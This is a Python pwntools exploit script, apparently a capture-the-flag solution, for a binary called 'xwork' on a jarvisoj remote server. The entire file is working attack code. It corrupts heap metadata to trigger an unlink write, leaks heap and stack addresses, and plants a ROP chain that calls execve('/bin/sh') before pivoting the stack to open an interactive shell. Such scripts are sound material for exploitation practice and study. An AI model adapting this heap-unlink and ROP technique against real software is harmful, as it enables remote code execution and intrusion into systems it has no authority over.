#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./xwork"
libcPath = ""
remoteAddr = "pwn2.jarvisoj.com"
remotePort = 9897

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def add(cont):
    assert len(cont) < 32
    io.sendlineafter("Exit\n", "1")
    io.send(cont)

def show(idx):
    assert 0 <= idx <= 10
    io.sendlineafter("Exit\n", "2")
    io.sendlineafter("index:", str(idx))

def edit(idx, cont):
    assert 0 <= idx <= 10
    assert len(cont) < 32
    io.sendlineafter("Exit\n", "3")
    io.sendlineafter("index:", str(idx))
    io.send(cont)

def delete(idx):
    assert 0 <= idx <= 10
    io.sendlineafter("Exit\n", "4")
    io.sendlineafter("index:", str(idx))

if __name__ == "__main__":
    io.sendlineafter("name:", "/bin/sh\0")
    chunk_list = 0x6CCD60

    add(flat(0, 0x51, chunk_list - 0x18, chunk_list - 0x10)[: -1]) 
    add(flat('1' * 16, 0, 0x31)[: -1]) 
    add('2' * 31) 
    add('3' * 31) 
    add('4' * 31) 
    delete(1)
    delete(2)
    show(2)
    chunk1addr = u32(io.recvn(4))
    success("chunk1addr", chunk1addr)

    # unlink
    edit(2, p64(chunk1addr + 0x20))
    add('5' * 31)
    add(flat(0x50, 0x90))
    delete(2)

    edit(0, flat(0, 0x6CBB80, 0, chunk_list + 0x8)[: -1])
    # leak stack
    edit(0, p64(0x6cc640))
    show(1)
    stack = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 0x188
    success("stack", stack)
    

    rop_addr = 0x6CBB60 + 0x700
    # 0x00000000004789a6 : pop rax ; pop rdx ; pop rbx ; ret
    edit(0, p64(rop_addr))
    edit(1, flat(0x4789a6, 59, 0, 0)[: -1])
    # 0x00000000004019c7 : pop rsi ; ret
    # 0x00000000004018a6 : pop rdi ; ret
    edit(0, p64(rop_addr + 0x20))
    edit(1, flat(0x4019c7, 0, 0x4018a6, 0x6CCDC0)[: -1])

    # 0x000000000043f365 : syscall ; ret
    edit(0, p64(rop_addr + 0x40))
    edit(1, p64(0x43f365))

    #  DEBUG([0x400BF0, 0x400B00, 0x400C65, 0x400CCD])
    # 0x0000000000400a12 : leave ; ret
    edit(0, p64(stack + 0x10))
    edit(1, flat(rop_addr - 8, 0x400a12))

    io.interactive()
